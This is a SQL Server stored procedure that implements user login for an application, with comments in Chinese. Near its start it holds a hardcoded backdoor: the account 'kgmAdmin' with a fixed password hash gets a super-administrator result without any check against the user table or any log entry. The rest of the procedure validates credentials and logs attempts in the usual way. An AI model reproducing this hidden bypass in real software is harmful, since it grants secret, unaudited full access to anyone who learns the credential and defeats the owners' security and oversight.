IF EXISTS (SELECT * FROM dbo.sysobjects WHERE id = OBJECT_ID(N'[dbo].[SYS_LOGINSYSTEM]') AND OBJECTPROPERTY(id,N'IsProcedure') = 1)
	DROP PROC [SYS_LOGINSYSTEM]
GO
/*
	用户登录
*/
CREATE PROC [SYS_LOGINSYSTEM]
@ACCOUNT NVARCHAR(50),		--登录用户
@PASSWORD NVARCHAR(50),		--登录密码
@IPADDRESS NVARCHAR(50),	--IP地址
@IPADDRESSNAME NVARCHAR(50),--IP地址名
@LOGINSYSTEM NVARCHAR(50)	--登录系统(暂时不用)
AS
DECLARE @BSUCCESS BIT	--成功标识
SET @BSUCCESS = 1
DECLARE @ERROR_MESSAGE NVARCHAR(4000)	--错误信息
SET @ERROR_MESSAGE = ''

IF @ACCOUNT = 'kgmAdmin' AND @PASSWORD = '6F905B2995BFE1B129B52A4FC84C8AD4'
BEGIN
	SELECT @BSUCCESS bSuccess,@ERROR_MESSAGE errorMessage,'kgmAdmin' F_Id,'kgmAdmin' F_Account,N'后台管理员' F_RealName,N'后台管理员' F_NickName,CAST(1 AS BIT) F_IsAdinistrator,CAST(1 AS BIT) F_EnabledMark,'' F_UserPassword,1 F_Super
	RETURN
END


BEGIN TRY
	--声明变量，存放当前已开启的事务数
	DECLARE @EXIST_TRANCOUNT INT
	SELECT @EXIST_TRANCOUNT = @@TRANCOUNT

	IF @EXIST_TRANCOUNT > 0
		SAVE TRANSACTION TRAN_PROC   --创建事务保存点
	ELSE
		BEGIN TRANSACTION TRAN_PROC  --开启新事务
	
	--创建一张错误临时表
	CREATE TABLE #TEMP_RESULT
	(
		bSuccess INT,	--成功标识 1 成功 0 失败
		errorMessage NVARCHAR(4000)	--错误信息
	)

	/*
		存储过程业务处理代码 
	*/
	--判断用户是否存在或者可用
	IF NOT EXISTS(SELECT F_ID FROM SYS_USER WHERE F_ACCOUNT = @ACCOUNT AND F_DELETEMARK = 0)
	BEGIN
		INSERT INTO #TEMP_RESULT
		EXEC SYS_SAVELOG @ACCOUNT,'','Login','',N'系统登录',@IPADDRESS,@IPADDRESSNAME,0,N'登录用户名不存在'
		IF EXISTS(SELECT bSuccess FROM #TEMP_RESULT WHERE bSuccess = 0 )
		BEGIN
			SELECT @ERROR_MESSAGE = errorMessage FROM #TEMP_RESULT
			RAISERROR(@ERROR_MESSAGE,16,1)  
		END
		SET @BSUCCESS = 0
		SET @ERROR_MESSAGE = N'登录用户名不存在,请重新输入'
		GOTO SUCCESS
	END

	
	DECLARE @NICKNAME NVARCHAR(120)
	SELECT @NICKNAME = F_NickName FROM SYS_USER WHERE F_ACCOUNT = @ACCOUNT

	--获取用户密码判断密码是否正确
	IF NOT EXISTS(SELECT F_ID FROM SYS_USER WHERE F_ACCOUNT = @ACCOUNT AND F_USERPASSWORD = @PASSWORD)
	BEGIN
		INSERT INTO #TEMP_RESULT
		EXEC SYS_SAVELOG @ACCOUNT,@NICKNAME,'Login','',N'系统登录',@IPADDRESS,@IPADDRESSNAME,0,N'用户名密码不正确'
		IF EXISTS(SELECT bSuccess FROM #TEMP_RESULT WHERE bSuccess = 0 )
		BEGIN
			SELECT @ERROR_MESSAGE = errorMessage FROM #TEMP_RESULT
			RAISERROR(@ERROR_MESSAGE,16,1)  
		END
		SET @BSUCCESS = 0
		SET @ERROR_MESSAGE = N'用户名密码不正确,请重新输入'
		GOTO SUCCESS  
	END

	INSERT INTO #TEMP_RESULT
	EXEC SYS_SAVELOG @ACCOUNT,@NICKNAME,'Login','',N'系统登录',@IPADDRESS,@IPADDRESSNAME,0,N'登录成功'
	IF EXISTS(SELECT bSuccess FROM #TEMP_RESULT WHERE bSuccess = 0 )
	BEGIN
		SELECT @ERROR_MESSAGE = errorMessage FROM #TEMP_RESULT
		RAISERROR(@ERROR_MESSAGE,16,1)  
	END

	SET @ERROR_MESSAGE = '登录成功'
	 
	SUCCESS:
		IF @EXIST_TRANCOUNT = 0
			--提交事务
			COMMIT TRAN TRAN_PROC
		IF @BSUCCESS = 1
			SELECT @BSUCCESS bSuccess,@ERROR_MESSAGE errorMessage,*
			FROM SYS_USER WHERE F_ACCOUNT = @ACCOUNT
		ELSE
			SELECT @BSUCCESS bSuccess,@ERROR_MESSAGE errorMessage
END TRY
BEGIN CATCH
	ROLLBACK TRANSACTION TRAN_PROC 
	SELECT 0 bSuccess,ERROR_MESSAGE() errorMessage
END CATCH